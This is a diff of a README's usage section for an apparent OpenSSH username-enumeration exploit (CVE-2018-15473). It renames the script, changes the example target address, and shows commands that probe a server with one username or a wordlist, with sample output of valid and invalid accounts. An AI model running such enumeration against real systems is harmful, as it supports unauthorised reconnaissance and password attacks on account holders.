@@ -18,13 +18,13 @@ foo@bar:~$ pip3 install -r requirements.txt
 
 ```shell
 #For single username:
-foo@bar:~$ ./CVE-2018-15473.py 192.168.1.20 -u root
+foo@bar:~$ ./openssh77.py 0.0.0.0 -u root
 [+] root is a valid username
 ```
 
 ```shell
 #For multiple username:
-foo@bar:~$ ./CVE-2018-15473.py 192.168.1.20 -w username_wordlist.txt
+foo@bar:~$ ./openssh77.py 0.0.0.0 -w username_wordlist.txt
 [+] root is a valid username
 [-] mysql is an invalid username
 [-] mike is an invalid username
@@ -36,7 +36,7 @@ root
 
 ```shell
 #For more option:
-foo@bar:~$ ./CVE-2018-15473.py -h
+foo@bar:~$ ./openssh77.py -h
 ```
 
 ## About the Vulnerability:
